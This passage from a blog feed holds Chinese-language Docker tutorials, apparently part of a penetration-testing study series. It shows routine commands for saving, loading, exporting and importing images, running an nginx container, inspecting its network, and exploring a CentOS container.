namespace">[root@192 92f7208b1cc0b5cc8fe214a4b0178aa4962b58af8ec535ee7211f335b1e0ed3b]</span><span class="token comment"># ls /var/lib/docker/overlay2/250dc0b4f2c5f27952241a55cd4c286bfaaf8af4b77c9d0a38976df4c147cb95</span><span class="token function">diff</span>  link  lower  work<span class="token namespace">[root@192 92f7208b1cc0b5cc8fe214a4b0178aa4962b58af8ec535ee7211f335b1e0ed3b]</span><span class="token comment"># ls /var/lib/docker/overlay2/250dc0b4f2c5f27952241a55cd4c286bfaaf8af4b77c9d0a38976df4c147cb95/diff</span>msb<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-docker-save"><a href="#3-2-docker-save" class="headerlink" title="3.2 docker save"></a>3.2 docker save</h2><blockquote><p>导出容器镜像，方便分享。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker save -o centos.tar centos:latest  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls</span>centos<span class="token punctuation">.</span>tar  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-docker-load"><a href="#3-3-docker-load" class="headerlink" title="3.3 docker load"></a>3.3 docker load</h2><blockquote><p>把他人分享的容器镜像导入到本地，这通常是容器镜像分发方式之一。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker load -i centos.tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-4-docker-export"><a href="#3-4-docker-export" class="headerlink" title="3.4 docker export"></a>3.4 docker export</h2><blockquote><p>把正在运行的容器导出</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND                  CREATED       STATUS       PORTS     NAMES355e99982248   centos:latest   <span class="token string">"bash"</span>                   7 hours ago   Up 7 hours             fervent_perlman<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker export -o centos7.tar 355e99982248</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls</span>centos7<span class="token punctuation">.</span>tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-5-docker-import"><a href="#3-5-docker-import" class="headerlink" title="3.5 docker import"></a>3.5 docker import</h2><blockquote><p>导入使用docker export导入的容器做为本地容器镜像。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls</span>centos7<span class="token punctuation">.</span>tar <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker import centos7.tar centos7:v1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED              SIZEcentos7      v1        3639f9a13231   17 seconds ago       231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过docker save与docker load及docker export与docker import分享容器镜像都是非常麻烦的，有没有更方便的方式分享容器镜像呢？</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/04-docker-he-xin-gai-nian-rong-qi-jing-xiang-jing-xiang-cang-ku-cao-zuo-shi-zhan/01-shi-yong-rong-qi-yun-xing-nginx-ji-docker-ming-ling-jie-shao/shi-yong-rong-qi-yun-xing-nginx-ying-yong-ji-docker-ming-ling/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/04-docker-he-xin-gai-nian-rong-qi-jing-xiang-jing-xiang-cang-ku-cao-zuo-shi-zhan/01-shi-yong-rong-qi-yun-xing-nginx-ji-docker-ming-ling-jie-shao/shi-yong-rong-qi-yun-xing-nginx-ying-yong-ji-docker-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="使用容器运行Nginx应用及Docker命令"><a href="#使用容器运行Nginx应用及Docker命令" class="headerlink" title="使用容器运行Nginx应用及Docker命令"></a>使用容器运行Nginx应用及Docker命令</h1><h1 id="一、使用容器运行Nginx应用"><a href="#一、使用容器运行Nginx应用" class="headerlink" title="一、使用容器运行Nginx应用"></a>一、使用容器运行Nginx应用</h1><h2 id="1-1-使用docker-run命令运行Nginx应用"><a href="#1-1-使用docker-run命令运行Nginx应用" class="headerlink" title="1.1 使用docker run命令运行Nginx应用"></a>1.1 使用docker run命令运行Nginx应用</h2><h3 id="1-1-1-观察下载容器镜像过程"><a href="#1-1-1-观察下载容器镜像过程" class="headerlink" title="1.1.1 观察下载容器镜像过程"></a>1.1.1 观察下载容器镜像过程</h3><blockquote><p>查找本地容器镜像文件</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">执行命令过程一：下载容器镜像<span class="token comment"># docker run -d nginx:latest</span>Unable to find image <span class="token string">'nginx:latest'</span> locallylatest: Pulling <span class="token keyword">from</span> library/nginxa2abf6c4d29d: Downloading  1<span class="token punctuation">.</span>966MB/31<span class="token punctuation">.</span>36MB 下载中a9edb18cadd1: Downloading  1<span class="token punctuation">.</span>572MB/25<span class="token punctuation">.</span>35MB589b7251471a: Download complete 下载完成186b1aaa4aa6: Download completeb4df32aa5a72: Waiting 等待下载a0bcbecc962e: Waiting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">执行命令过程二：下载容器镜像<span class="token namespace">[root@localhost ~]</span><span class="token comment"># docker run -d nginx:latest</span>Unable to find image <span class="token string">'nginx:latest'</span> locallylatest: Pulling <span class="token keyword">from</span> library/nginxa2abf6c4d29d: Downloading  22<span class="token punctuation">.</span>87MB/31<span class="token punctuation">.</span>36MBa9edb18cadd1: Downloading  22<span class="token punctuation">.</span>78MB/25<span class="token punctuation">.</span>35MB589b7251471a: Waiting186b1aaa4aa6: Waitingb4df32aa5a72: Waiting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">执行命令过程三：下载容器镜像<span class="token namespace">[root@localhost ~]</span><span class="token comment"># docker run -d nginx:latest</span>Unable to find image <span class="token string">'nginx:latest'</span> locallylatest: Pulling <span class="token keyword">from</span> library/nginxa2abf6c4d29d: Pull complete 下载完成a9edb18cadd1: Pull complete589b7251471a: Pull complete186b1aaa4aa6: Pull completeb4df32aa5a72: Waiting 等待下载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-2-观察容器运行情况"><a href="#1-1-2-观察容器运行情况" class="headerlink" title="1.1.2 观察容器运行情况"></a>1.1.2 观察容器运行情况</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d nginx:latest</span>9834c8c18a7c7c89ab0ea4119d11bafe9c18313c8006bc02ce57ff54d9a1cc0c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker run 启动一个容器<span class="token operator">-</span>d 把容器镜像中需要执行的命令以daemon（守护进程）的方式运行nginx 应用容器镜像的名称，通常表示该镜像为某一个软件latest 表示上述容器镜像的版本，表示最新版本，用户可自定义其标识，例如v1或v2等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE        COMMAND                  CREATED          STATUS        PORTS     NAMES9834c8c18a7c   nginx:latest <span class="token string">"/docker-entrypoint.…"</span>   24 seconds ago   Up 23 seconds 80/tcp condescending_pare<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker <span class="token function">ps</span> 类似于Linux系统的<span class="token function">ps</span>命令，查看正在运行的容器，如果想查看没有运行的容器，需要在此命令后使用<span class="token operator">--</span>all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>输出内容解释</strong></p><table><thead><tr><th>CONTAINERID</th><th>IMAGE</th><th>COMMAND</th><th>CREATED</th><th>STATUS</th><th>PORTS</th><th>NAMES</th></tr></thead><tbody><tr><td>9834c8c18a7c</td><td>nginx:latest</td><td>“/docker-entrypoint.…”</td><td>24 seconds ago</td><td>Up 23 seconds</td><td>80/tcp</td><td>condescending_pare</td></tr></tbody></table><h2 id="1-2-访问容器中运行的Nginx服务"><a href="#1-2-访问容器中运行的Nginx服务" class="headerlink" title="1.2 访问容器中运行的Nginx服务"></a>1.2 访问容器中运行的Nginx服务</h2><h3 id="1-2-1-确认容器IP地址"><a href="#1-2-1-确认容器IP地址" class="headerlink" title="1.2.1 确认容器IP地址"></a>1.2.1 确认容器IP地址</h3><blockquote><p>实际工作中不需要此步操作。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"> <span class="token comment"># docker inspect 9834</span>  <span class="token string">"GlobalIPv6Address"</span>: <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token string">"GlobalIPv6PrefixLen"</span>: 0<span class="token punctuation">,</span>            <span class="token string">"IPAddress"</span>: <span class="token string">"172.17.0.2"</span><span class="token punctuation">,</span> 容器IP地址            <span class="token string">"IPPrefixLen"</span>: 16<span class="token punctuation">,</span>            <span class="token string">"IPv6Gateway"</span>: <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token string">"MacAddress"</span>: <span class="token string">"02:42:ac:11:00:02"</span><span class="token punctuation">,</span>            <span class="token string">"Networks"</span>: <span class="token punctuation">{</span>                <span class="token string">"bridge"</span>: <span class="token punctuation">{</span>                    <span class="token string">"IPAMConfig"</span>: null<span class="token punctuation">,</span>                    <span class="token string">"Links"</span>: null<span class="token punctuation">,</span>                    <span class="token string">"Aliases"</span>: null<span class="token punctuation">,</span>                    <span class="token string">"NetworkID"</span>: <span class="token string">"d3de2fdbc30ee36a55c1431ef3ae4578392e552009f00b2019b4720735fe5a60"</span><span class="token punctuation">,</span>                    <span class="token string">"EndpointID"</span>: <span class="token string">"d91f47c9f756ff22dc599a207164f2e9366bd0c530882ce0f08ae2278fb3d50c"</span><span class="token punctuation">,</span>                    <span class="token string">"Gateway"</span>: <span class="token string">"172.17.0.1"</span><span class="token punctuation">,</span>                    <span class="token string">"IPAddress"</span>: <span class="token string">"172.17.0.2"</span><span class="token punctuation">,</span>   容器IP地址                    <span class="token string">"IPPrefixLen"</span>: 16<span class="token punctuation">,</span>                    <span class="token string">"IPv6Gateway"</span>: <span class="token string">""</span><span class="token punctuation">,</span>                    <span class="token string">"GlobalIPv6Address"</span>: <span class="token string">""</span><span class="token punctuation">,</span>                    <span class="token string">"GlobalIPv6PrefixLen"</span>: 0<span class="token punctuation">,</span>                    <span class="token string">"MacAddress"</span>: <span class="token string">"02:42:ac:11:00:02"</span><span class="token punctuation">,</span>                    <span class="token string">"DriverOpts"</span>: null                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker inspect 为查看容器结构信息命令9834 为前面生成的容器ID号前4位，使用这个ID号时，由于其较长，使用时能最短识别即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-2-2-容器网络说明"><a href="#1-2-2-容器网络说明" class="headerlink" title="1.2.2 容器网络说明"></a>1.2.2 容器网络说明</h3><p><img src="%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8CNginx%E5%BA%94%E7%94%A8%E5%8F%8ADocker%E5%91%BD%E4%BB%A4.assets/image-20220121172037253.png" alt="image-20220121172037253"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ip a s</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>docker0网桥，用于为容器提供桥接，转发到主机之外的网络5: docker0: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST<span class="token punctuation">,</span>UP<span class="token punctuation">,</span>LOWER_UP&gt; mtu 1500 qdisc noqueue state UP <span class="token function">group</span> default    link/ether 02:42:d5:c3:d4:cc brd ff:ff:ff:ff:ff:ff    inet 172<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1/16 brd 172<span class="token punctuation">.</span>17<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255 scope global docker0       valid_lft forever preferred_lft forever    inet6 fe80::42:d5ff:fec3:d4cc/64 scope link       valid_lft forever preferred_lft forever              与容器中的虚拟网络设备在同一个命名空间中，用于把容器中的网络连接到主机9: veth393dece@if8: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST<span class="token punctuation">,</span>UP<span class="token punctuation">,</span>LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP <span class="token function">group</span> default    link/ether 02:e3:11:58:54:0f brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet6 fe80::e3:11ff:fe58:540f/64 scope link       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-3-使用curl命令访问"><a href="#1-2-3-使用curl命令访问" class="headerlink" title="1.2.3 使用curl命令访问"></a>1.2.3 使用curl命令访问</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># curl http://172.17.0.2</span>返回结果，表示访问成功！&lt;<span class="token operator">!</span>DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;<span class="token operator">/</span>title&gt;&lt;style&gt;html <span class="token punctuation">{</span> color-scheme: light dark<span class="token punctuation">;</span> <span class="token punctuation">}</span>body <span class="token punctuation">{</span> width: 35em<span class="token punctuation">;</span> margin: 0 auto<span class="token punctuation">;</span>font-family: Tahoma<span class="token punctuation">,</span> Verdana<span class="token punctuation">,</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span> <span class="token punctuation">}</span>&lt;<span class="token operator">/</span>style&gt;&lt;<span class="token operator">/</span>head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;<span class="token operator">/</span>h1&gt;&lt;p&gt;<span class="token keyword">If</span> you see this page<span class="token punctuation">,</span> the nginx web server is successfully installed andworking<span class="token punctuation">.</span> Further configuration is required<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>p&gt;&lt;p&gt;<span class="token keyword">For</span> online documentation and support please refer to&lt;a href=<span class="token string">"http://nginx.org/"</span>&gt;nginx<span class="token punctuation">.</span>org&lt;<span class="token operator">/</span>a&gt;<span class="token punctuation">.</span>&lt;br/&gt;Commercial support is available at&lt;a href=<span class="token string">"http://nginx.com/"</span>&gt;nginx<span class="token punctuation">.</span>com&lt;<span class="token operator">/</span>a&gt;<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>p&gt;&lt;p&gt;&lt;em&gt;Thank you <span class="token keyword">for</span> <span class="token keyword">using</span> nginx<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>em&gt;&lt;<span class="token operator">/</span>p&gt;&lt;<span class="token operator">/</span>body&gt;&lt;<span class="token operator">/</span>html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二、Docker命令"><a href="#二、Docker命令" class="headerlink" title="二、Docker命令"></a>二、Docker命令</h1><h2 id="2-1-Docker命令获取帮助方法"><a href="#2-1-Docker命令获取帮助方法" class="headerlink" title="2.1 Docker命令获取帮助方法"></a>2.1 Docker命令获取帮助方法</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker -h</span>Flag shorthand <span class="token operator">-</span>h has been deprecated<span class="token punctuation">,</span> please use <span class="token operator">--</span>helpUsage:  docker <span class="token namespace">[OPTIONS]</span> COMMAND  用法A self-sufficient runtime <span class="token keyword">for</span> containers 功能介绍Options: 选项      <span class="token operator">--</span>config string      Location of client config files <span class="token punctuation">(</span>default <span class="token string">"/root/.docker"</span><span class="token punctuation">)</span>  <span class="token operator">-</span>c<span class="token punctuation">,</span> <span class="token operator">--</span>context string     Name of the context to use to connect to the daemon <span class="token punctuation">(</span>overrides                           DOCKER_HOST env <span class="token keyword">var</span> and default context <span class="token function">set</span> with <span class="token string">"docker context use"</span><span class="token punctuation">)</span>  <span class="token operator">-</span>D<span class="token punctuation">,</span> <span class="token operator">--</span>debug              Enable debug mode  <span class="token operator">-</span>H<span class="token punctuation">,</span> <span class="token operator">--</span>host list          Daemon socket<span class="token punctuation">(</span>s<span class="token punctuation">)</span> to connect to  <span class="token operator">-</span>l<span class="token punctuation">,</span> <span class="token operator">--</span>log-level string   <span class="token function">Set</span> the logging level <span class="token punctuation">(</span><span class="token string">"debug"</span><span class="token punctuation">|</span><span class="token string">"info"</span><span class="token punctuation">|</span><span class="token string">"warn"</span><span class="token punctuation">|</span><span class="token string">"error"</span><span class="token punctuation">|</span><span class="token string">"fatal"</span><span class="token punctuation">)</span>                           <span class="token punctuation">(</span>default <span class="token string">"info"</span><span class="token punctuation">)</span>      <span class="token operator">--</span>tls                Use TLS<span class="token punctuation">;</span> implied by <span class="token operator">--</span>tlsverify      <span class="token operator">--</span>tlscacert string   Trust certs signed only by this CA <span class="token punctuation">(</span>default <span class="token string">"/root/.docker/ca.pem"</span><span class="token punctuation">)</span>      <span class="token operator">--</span>tlscert string     Path to TLS certificate file <span class="token punctuation">(</span>default <span class="token string">"/root/.docker/cert.pem"</span><span class="token punctuation">)</span>      <span class="token operator">--</span>tlskey string      Path to TLS key file <span class="token punctuation">(</span>default <span class="token string">"/root/.docker/key.pem"</span><span class="token punctuation">)</span>      <span class="token operator">--</span>tlsverify          Use TLS and verify the remote  <span class="token operator">-</span>v<span class="token punctuation">,</span> <span class="token operator">--</span>version            Print version information and quitManagement Commands: 管理类命令  app*        Docker App <span class="token punctuation">(</span>Docker Inc<span class="token punctuation">.</span><span class="token punctuation">,</span> v0<span class="token punctuation">.</span>9<span class="token punctuation">.</span>1-beta3<span class="token punctuation">)</span>  builder     Manage builds  buildx*     Docker Buildx <span class="token punctuation">(</span>Docker Inc<span class="token punctuation">.</span><span class="token punctuation">,</span> v0<span class="token punctuation">.</span>7<span class="token punctuation">.</span>1-docker<span class="token punctuation">)</span>  config      Manage Docker configs  container   Manage containers  context     Manage contexts  image       Manage images  manifest    Manage Docker image manifests and manifest lists  network     Manage networks  node        Manage Swarm nodes  plugin      Manage plugins  scan*       Docker Scan <span class="token punctuation">(</span>Docker Inc<span class="token punctuation">.</span><span class="token punctuation">,</span> v0<span class="token punctuation">.</span>12<span class="token punctuation">.</span>0<span class="token punctuation">)</span>  secret      Manage Docker secrets  service     Manage services  stack       Manage Docker stacks  swarm       Manage Swarm  system      Manage Docker  trust       Manage trust on Docker images  volume      Manage volumesCommands: 未分组命令  attach      Attach local standard input<span class="token punctuation">,</span> output<span class="token punctuation">,</span> and error streams to a running container  build       Build an image <span class="token keyword">from</span> a Dockerfile  commit      Create a new image <span class="token keyword">from</span> a container<span class="token string">'s changes  cp          Copy files/folders between a container and the local filesystem  create      Create a new container  diff        Inspect changes to files or directories on a container'</span>s filesystem  events      Get real time events <span class="token keyword">from</span> the server  exec        Run a command in a running container  export      Export a container's filesystem as a tar archive  history     Show the history of an image  images      List images  import      Import the contents <span class="token keyword">from</span> a tarball to create a filesystem image  info        Display system-wide information  inspect     <span class="token keyword">Return</span> low-level information on Docker objects  <span class="token function">kill</span>        <span class="token function">Kill</span> one or more running containers  load        Load an image <span class="token keyword">from</span> a tar archive or STDIN  login       Log in to a Docker registry  logout      Log out <span class="token keyword">from</span> a Docker registry  logs        Fetch the logs of a container  pause       Pause all processes within one or more containers  port        List port mappings or a specific mapping <span class="token keyword">for</span> the container  <span class="token function">ps</span>          List containers  pull        Pull an image or a repository <span class="token keyword">from</span> a registry  push        Push an image or a repository to a registry  rename      Rename a container  restart     Restart one or more containers  <span class="token function">rm</span>          Remove one or more containers  rmi         Remove one or more images  run         Run a command in a new container  save        Save one or more images to a tar archive <span class="token punctuation">(</span>streamed to STDOUT by default<span class="token punctuation">)</span>  search      Search the Docker Hub <span class="token keyword">for</span> images  <span class="token function">start</span>       <span class="token function">Start</span> one or more stopped containers  stats       Display a live stream of container<span class="token punctuation">(</span>s<span class="token punctuation">)</span> resource usage statistics  stop        Stop one or more running containers  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE  top         Display the running processes of a container  unpause     Unpause all processes within one or more containers  update      Update configuration of one or more containers  version     Show the Docker version information  wait        Block <span class="token keyword">until</span> one or more containers stop<span class="token punctuation">,</span> then print their <span class="token keyword">exit</span> codes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-Docker官网提供的命令说明"><a href="#2-2-Docker官网提供的命令说明" class="headerlink" title="2.2 Docker官网提供的命令说明"></a>2.2 Docker官网提供的命令说明</h2><p>网址链接：<a href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p><p><img src="%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8CNginx%E5%BA%94%E7%94%A8%E5%8F%8ADocker%E5%91%BD%E4%BB%A4.assets/image-20220121173519802.png" alt="image-20220121173519802"></p><p><img src="%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8CNginx%E5%BA%94%E7%94%A8%E5%8F%8ADocker%E5%91%BD%E4%BB%A4.assets/image-20220121173613294.png" alt="image-20220121173613294"></p><p><img src="%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8CNginx%E5%BA%94%E7%94%A8%E5%8F%8ADocker%E5%91%BD%E4%BB%A4.assets/image-20220121173705508.png" alt="image-20220121173705508"></p><h2 id="2-3-docker命令应用"><a href="#2-3-docker命令应用" class="headerlink" title="2.3 docker命令应用"></a>2.3 docker命令应用</h2><h3 id="2-3-1-docker-run"><a href="#2-3-1-docker-run" class="headerlink" title="2.3.1 docker run"></a>2.3.1 docker run</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -i -t --name c1 centos:latest bash</span><span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker run 运行一个命令在容器中，命令是主体，没有命令容器就会消亡<span class="token operator">-</span>i 交互式<span class="token operator">-</span>t 提供终端<span class="token operator">--</span>name c1 把将运行的容器命名为c1centos:latest 使用centos最新版本容器镜像bash 在容器中执行的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看主机名<span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看网络信息<span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment"># ip a s</span>1: lo: &lt;LOOPBACK<span class="token punctuation">,</span>UP<span class="token punctuation">,</span>LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN <span class="token function">group</span> default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1/8 scope host lo       valid_lft forever preferred_lft forever12: eth0@if13: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST<span class="token punctuation">,</span>UP<span class="token punctuation">,</span>LOWER_UP&gt; mtu 1500 qdisc noqueue state UP <span class="token function">group</span> default    link/ether 02:42:<span class="token function">ac</span>:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 172<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3/16 brd 172<span class="token punctuation">.</span>17<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255 scope global eth0       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看进程<span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment"># ps aux</span>USER        PID <span class="token operator">%</span>CPU <span class="token operator">%</span>MEM    VSZ   RSS TTY      STAT <span class="token function">START</span>   TIME COMMANDroot          1  0<span class="token punctuation">.</span>0  0<span class="token punctuation">.</span>1  12036  2172 pts/0    Ss   09:58   0:00 bashroot         16  0<span class="token punctuation">.</span>0  0<span class="token punctuation">.</span>0  44652  1784 pts/0    R+   10:02   0:00 <span class="token function">ps</span> aux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看用户<span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment"># cat /etc/passwd</span>root:x:0:0:root:<span class="token operator">/</span>root:<span class="token operator">/</span>bin/bashbin:x:1:1:bin:<span class="token operator">/</span>bin:<span class="token operator">/</span>sbin/nologindaemon:x:2:2:daemon:<span class="token operator">/</span>sbin:<span class="token operator">/</span>sbin/nologinadm:x:3:4:adm:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>adm:<span class="token operator">/</span>sbin/nologin<span class="token function">lp</span>:x:4:7:<span class="token function">lp</span>:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool/lpd:<span class="token operator">/</span>sbin/nologinsync:x:5:0:sync:<span class="token operator">/</span>sbin:<span class="token operator">/</span>bin/syncshutdown:x:6:0:shutdown:<span class="token operator">/</span>sbin:<span class="token operator">/</span>sbin/shutdownhalt:x:7:0:halt:<span class="token operator">/</span>sbin:<span class="token operator">/</span>sbin/haltmail:x:8:12:mail:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool/mail:<span class="token operator">/</span>sbin/nologinoperator:x:11:0:operator:<span class="token operator">/</span>root:<span class="token operator">/</span>sbin/nologingames:x:12:100:games:<span class="token operator">/</span>usr/games:<span class="token operator">/</span>sbin/nologinftp:x:14:50:FTP User:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>ftp:<span class="token operator">/</span>sbin/nologinnobody:x:65534:65534:Kernel Overflow User:<span class="token operator">/</span>:<span class="token operator">/</span>sbin/nologindbus:x:81:81:System message bus:<span class="token operator">/</span>:<span class="token operator">/</span>sbin/nologinsystemd-coredump:x:999:997:systemd Core Dumper:<span class="token operator">/</span>:<span class="token operator">/</span>sbin/nologinsystemd-resolve:x:193:193:systemd Resolver:<span class="token operator">/</span>:<span class="token operator">/</span>sbin/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看目录<span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment"># pwd</span><span class="token operator">/</span><span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment"># ls</span>bin  etc   lib    lost+found  mnt  proc  run   srv  tmp  <span class="token 